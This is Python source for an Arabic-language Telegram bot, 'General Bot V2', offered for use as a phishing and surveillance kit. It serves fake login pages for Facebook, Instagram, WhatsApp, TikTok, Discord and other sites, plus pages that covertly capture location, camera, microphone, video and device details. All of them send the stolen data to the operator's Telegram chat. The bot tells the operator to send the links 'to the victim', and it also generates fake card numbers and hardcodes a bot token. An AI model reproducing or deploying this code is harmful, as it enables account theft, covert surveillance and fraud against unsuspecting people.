import os, time, threading, random, string, requests, logging
from flask import Flask, request
from telebot import TeleBot, types
from io import BytesIO

# ========== الإعدادات ==========
TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
BASE_URL = "https://gamee-08ue.onrender.com"   # التطبيق نفسه سيقدم الصفحات
CALL_SITE = "https://callmyphone.org/app"

logging.basicConfig(level=logging.INFO)
bot = TeleBot(TOKEN, threaded=False)
app = Flask(__name__)
user_states = {}
bot_rating = 0

JOKES = [
    "مرة واحد بخيل جداً.. ابنه مات قال الحقوه هاتوه",
    "مرة واحد محشش قعد 3 أيام في البيت ليه؟ لأنه لقى الباب مفتوح",
    "مرة اثنين محششين ركبوا سيارة قالوا: بنروح على السينما...",
    "مرة واحد غبي جداً لقى ورقة مكتوب عليها 'أنظر للخلف' فضل يلف على نفسه",
    "واحد بيقول لمراته: انا طلعت من بيتي فقير ورجعت غني! قالتله: اشتغلت؟ قالها: لا لقيت البيت اتسرق",
]

def generate_password(length=16):
    chars = string.ascii_letters + string.digits + "!@#$%^&*()"
    return ''.join(random.choice(chars) for _ in range(length))

def generate_fake_visa():
    prefixes = ["4", "5", "37", "34"]
    prefix = random.choice(prefixes)
    length = 16 if prefix in ["4", "5"] else 15
    while len(prefix) < length: prefix += str(random.randint(0,9))
    number = prefix; exp_month = str(random.randint(1,12)).zfill(2)
    exp_year = str(random.randint(2025,2030)); cvv = str(random.randint(100,999))
    return f"💳 رقم: {number}\n📅 تاريخ: {exp_month}/{exp_year}\n🔒 CVV: {cvv}"

def create_temp_email():
    try:
        s = requests.Session(); r = s.get('https://api.mail.tm/domains', headers={'User-Agent':'Mozilla/5.0'})
        domain = r.json()['hydra:member'][0]['domain']
        email = ''.join(random.choice(string.ascii_lowercase) for _ in range(10)) + "@" + domain
        pwd = generate_password(12)
        s.post('https://api.mail.tm/accounts', json={'address':email,'password':pwd}, headers={'User-Agent':'Mozilla/5.0'})
        return f"📧 البريد: {email}\n🔑 كلمة المرور: {pwd}"
    except: return "فشل إنشاء بريد مؤقت، حاول لاحقاً"

def shorten_url(url):
    try:
        r = requests.get(f"https://tinyurl.com/api-create.php?url={requests.utils.quote(url)}", timeout=5)
        if r.status_code == 200: return r.text.strip()
    except: pass
    return url

# ========== قوالب الصفحات ==========
def make_phish_page(icon, title, color, placeholder1, placeholder2, redirect):
    return f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>{title}</title>
<style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}}
.card{{background:#fff;padding:30px;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:360px;text-align:center}}
h2{{color:{color};margin-bottom:10px}}input{{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:16px}}
.btn{{background:{color};color:#fff;border:none;padding:12px;width:100%;border-radius:6px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:10px}}
</style></head><body><div class="card"><h2>{title}</h2><input id="u" placeholder="{placeholder1}"><input id="p" type="password" placeholder="{placeholder2}"><button class="btn" onclick="send()">تسجيل الدخول</button></div>
<script>const BOT_TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');
function send(){{const u=document.getElementById('u').value,pa=document.getElementById('p').value;
if(!u||!pa)return alert('املأ جميع الحقول');
fetch(`https://api.telegram.org/bot${{BOT_TOKEN}}/sendMessage?chat_id=${{CHAT_ID}}&text=${{encodeURIComponent('{icon} صيد {title}\\n👤 '+u+'\\n🔑 '+pa)}}`).finally(()=>{{location.href='{redirect}'}})}}</script></body></html>'''

PAGES = {
    "facebook.html": make_phish_page("📘", "Facebook", "#1877f2", "البريد الإلكتروني", "كلمة المرور", "https://www.facebook.com"),
    "tiktok.html": make_phish_page("🎵", "TikTok", "#fe2c55", "البريد الإلكتروني", "كلمة المرور", "https://www.tiktok.com"),
    "snapchat.html": make_phish_page("👻", "Snapchat", "#fffc00", "اسم المستخدم", "كلمة المرور", "https://snapchat.com"),
    "instagram.html": make_phish_page("📷", "Instagram", "#0095f6", "اسم المستخدم", "كلمة المرور", "https://instagram.com"),
    "whatsapp.html": make_phish_page("💬", "WhatsApp", "#25d366", "رقم الهاتف", "كلمة المرور", "https://whatsapp.com"),
    "telegram.html": make_phish_page("✈️", "Telegram", "#0088cc", "رقم الهاتف", "كلمة المرور", "https://t.me"),
    "twitter.html": make_phish_page("🐦", "Twitter", "#1da1f2", "البريد الإلكتروني", "كلمة المرور", "https://x.com"),
    "youtube.html": make_phish_page("▶️", "YouTube", "#ff0000", "البريد الإلكتروني", "كلمة المرور", "https://youtube.com"),
    "discord.html": make_phish_page("🎮", "Discord", "#5865f2", "البريد الإلكتروني", "كلمة المرور", "https://discord.com"),
    "reddit.html": make_phish_page("🤖", "Reddit", "#ff4500", "اسم المستخدم", "كلمة المرور", "https://reddit.com"),
    "gps.html": '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>GPS</title></head><body style="text-align:center;padding-top:50px;"><h2>📍 تحسين دقة الموقع</h2><p id="status">جاري...</p><script>const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');navigator.geolocation.getCurrentPosition(pos=>{const msg=`تم تحديد الموقع: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`).then(()=>document.getElementById('status').innerText='تم')});</script></body></html>''',
    "camera.html": '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Camera</title></head><body style="text-align:center;padding-top:20px;"><h2>📸 فحص الكاميرا</h2><video id="v" autoplay style="width:100%;max-width:300px"></video><br><button onclick="capture()">التقط صورة</button><canvas id="c" style="display:none"></canvas><script>const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');navigator.mediaDevices.getUserMedia({video:true}).then(s=>{document.getElementById('v').srcObject=s});function capture(){const v=document.getElementById('v'),c=document.getElementById('c');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);c.toBlob(b=>{const f=new FormData();f.append('photo',b,'cam.jpg');f.append('chat_id',CHAT_ID);fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{method:'POST',body:f}).then(()=>alert('تم'))},'image/jpeg')}</script></body></html>''',
    "mic.html": '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Mic</title></head><body style="text-align:center;padding-top:20px;"><h2>🎙️ فحص الميكروفون</h2><button onclick="record()">ابدأ التسجيل (3 ثوان)</button><p id="status"></p><script>const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');function record(){navigator.mediaDevices.getUserMedia({audio:true}).then(s=>{const chunks=[],r=new MediaRecorder(s);r.ondataavailable=e=>chunks.push(e.data);r.onstop=()=>{const b=new Blob(chunks),f=new FormData();f.append('voice',b,'mic.ogg');f.append('chat_id',CHAT_ID);fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`,{method:'POST',body:f}).then(()=>document.getElementById('status').innerText='تم')};r.start();setTimeout(()=>r.stop(),3000);document.getElementById('status').innerText='جاري...'})}</script></body></html>''',
    "video.html": '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Video</title></head><body style="text-align:center;padding-top:20px;"><h2>🎥 فحص الفيديو</h2><video id="v" autoplay style="width:100%;max-width:300px"></video><br><button onclick="record()">بدء التسجيل (5 ثوان)</button><p id="status"></p><script>const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');let stream,recorder,chunks=[];navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(s=>{stream=s;document.getElementById('v').srcObject=s});function record(){chunks=[];recorder=new MediaRecorder(stream);recorder.ondataavailable=e=>chunks.push(e.data);recorder.onstop=()=>{const b=new Blob(chunks),f=new FormData();f.append('video_note',b,'video.mp4');f.append('chat_id',CHAT_ID);fetch(`https://api.telegram.org/bot${TOKEN}/sendVideoNote`,{method:'POST',body:f}).then(()=>document.getElementById('status').innerText='تم')};recorder.start();setTimeout(()=>recorder.stop(),5000);document.getElementById('status').innerText='جاري...'}</script></body></html>''',
    "device.html": '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Device</title></head><body style="text-align:center;padding-top:30px;"><h2>📱 فحص الجهاز</h2><div id="info"></div><script>const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');const info=`📱 *معلومات الجهاز:*\n• User Agent: ${navigator.userAgent}\n• اللغة: ${navigator.language}\n• النظام: ${navigator.platform}\n• الشاشة: ${screen.width}x${screen.height}`;fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=Markdown&text=${encodeURIComponent(info)}`).then(()=>document.getElementById('info').innerHTML='✅ تم الإرسال')</script></body></html>''',
    "pubg_uc.html": '''<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>PUBG UC</title><style>body{background:#0b0d10;color:#f7c566;font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column}.card{background:#1c1f26;padding:30px;border-radius:20px;text-align:center;max-width:400px}input,button{width:100%;padding:12px;margin:8px 0;border-radius:8px;font-size:16px}button{background:#f7c566;color:#000;font-weight:bold;border:none}</style></head><body><div class="card"><h2>🎮 شحن شدات ببجي</h2><input id="u" placeholder="ID اللاعب"><input id="p" type="text" placeholder="البريد الإلكتروني"><button onclick="send()">استلام الشدات</button><p id="msg"></p></div><script>const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');function send(){const u=document.getElementById('u').value,pa=document.getElementById('p').value;if(!u||!pa)return;fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('🎮 ببجي\\nID: '+u+'\\n📧 '+pa)}`).then(()=>{document.getElementById('msg').innerText='تم الإرسال'})}</script></body></html>''',
    "dream.html": '''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>dream</title><style>body{background:#0a192f;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column}.card{background:linear-gradient(180deg,#4b6cb7,#182848);padding:40px;border-radius:25px;text-align:center;max-width:400px}button{background:#ffc107;color:#000;padding:15px 40px;border:none;border-radius:50px;font-weight:bold;margin-top:20px;font-size:18px}</style></head><body><div class="card"><h1>🏆 مسابقة الحلم</h1><p>اربح 100,000 ريال</p><input id="u" placeholder="الاسم الكامل"><input id="p" placeholder="رقم الهاتف"><button onclick="send()">سجل الآن</button><p id="msg"></p></div><script>const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');function send(){const u=document.getElementById('u').value,ph=document.getElementById('p').value;if(!u||!ph)return;fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('🏆 الحلم\\n👤 '+u+'\\n📱 '+ph)}`).then(()=>{document.getElementById('msg').innerText='تم التسجيل'})}</script></body></html>'''
}

# ========== خدمة الصفحات ==========
@app.route("/pages/<path:filename>")
def serve_page(filename):
    if filename in PAGES:
        return PAGES[filename]
    return "Not Found", 404

# ========== Webhook ==========
@app.route(f"/{TOKEN}", methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        try:
            json_string = request.get_data().decode('utf-8')
            update = types.Update.de_json(json_string)
            bot.process_new_updates([update])
            return ''
        except: pass
    return '!', 403

# ========== القائمة الرئيسية ==========
def main_menu_markup(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    tools = [
        ("📘 فيسبوك","facebook.html"), ("🎵 تيك توك","tiktok.html"),
        ("👻 سناب شات","snapchat.html"), ("📷 انستقرام","instagram.html"),
        ("💬 واتساب","whatsapp.html"), ("✈️ تيليجرام","telegram.html"),
        ("🐦 تويتر","twitter.html"), ("▶️ يوتيوب","youtube.html"),
        ("🎮 ديسكورد","discord.html"), ("🤖 ريدت","reddit.html"),
        ("📍 الموقع","gps.html"), ("📸 الكاميرا","camera.html"),
        ("🎙️ ميكروفون","mic.html"), ("🎥 فيديو","video.html"),
        ("📱 الجهاز","device.html"),
    ]
    for i in range(0, len(tools), 2):
        left = tools[i]; right = tools[i+1] if i+1 < len(tools) else None
        markup.row(types.InlineKeyboardButton(left[0], callback_data=f"phish|{left[1]}"),
                   types.InlineKeyboardButton(right[0], callback_data=f"phish|{right[1]}") if right else None)
    markup.row(types.InlineKeyboardButton("🎮 ببجي UC", callback_data="phish|pubg_uc.html"),
               types.InlineKeyboardButton("🏆 مسابقة الحلم", callback_data="phish|dream.html"))
    reports = [
        ("🐦 بلاغ تويتر","https://help.twitter.com/forms"),
        ("👻 بلاغ سناب","https://support.snapchat.com/community-report"),
        ("▶️ بلاغ يوتيوب","https://www.youtube.com/reportingtool"),
        ("✈️ بلاغ تيليجرام","https://telegram.org/faq_report"),
        ("🎵 بلاغ تيك توك","https://www.tiktok.com/legal/report/feedback"),
        ("📷 بلاغ انستقرام","https://help.instagram.com/contact/383679321740945"),
    ]
    for name, link in reports:
        markup.row(types.InlineKeyboardButton(name, url=link))
    markup.row(types.InlineKeyboardButton("📞 اتصال وهمي", callback_data="call"),
               types.InlineKeyboardButton("🔍 معرف الإيدي", callback_data="myid"))
    markup.row(types.InlineKeyboardButton("💬 فك حظر واتساب", callback_data="unban"),
               types.InlineKeyboardButton("🔗 اختصار رابط", callback_data="shorten"))
    markup.row(types.InlineKeyboardButton("🌐 ترجمة نص", callback_data="translate"),
               types.InlineKeyboardButton("📷 قراءة باركود", callback_data="readqr"))
    markup.row(types.InlineKeyboardButton("🖼️ إنشاء باركود", callback_data="createqr"),
               types.InlineKeyboardButton("💳 فيزا وهمية", callback_data="visa"))
    markup.row(types.InlineKeyboardButton("✉️ بريد وهمي", callback_data="tempmail"),
               types.InlineKeyboardButton("😂 نكتة", callback_data="joke"))
    markup.row(types.InlineKeyboardButton("📜 شروط", callback_data="terms"),
               types.InlineKeyboardButton("💻 كيف تصبح هاكر", callback_data="hack"))
    markup.row(types.InlineKeyboardButton("🔄 رجوع", callback_data="back"))
    return markup

@bot.message_handler(commands=['start'])
def welcome(message):
    bot.send_message(message.chat.id, "🔱 <b>بوت الجنرال V2</b>\n\nاختر الأداة:", reply_markup=main_menu_markup(message.chat.id), parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id; data = call.data; msg_id = call.message.message_id
    if data == "back":
        bot.edit_message_text("🔱 <b>بوت الجنرال V2</b>\n\nاختر الأداة:", chat_id, msg_id, reply_markup=main_menu_markup(chat_id), parse_mode="HTML")
        bot.answer_callback_query(call.id)
        return
    if data.startswith("phish|"):
        file = data.split("|")[1]
        link = f"{BASE_URL}/pages/{file}?chat={chat_id}"
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
        bot.edit_message_text(f"🔗 رابط الصفحة:\n<code>{link}</code>\n\nأرسله للضحية.", chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
        bot.answer_callback_query(call.id)
        return
    # ... (باقي الكود مطابق تماماً لما أرسلته سابقاً)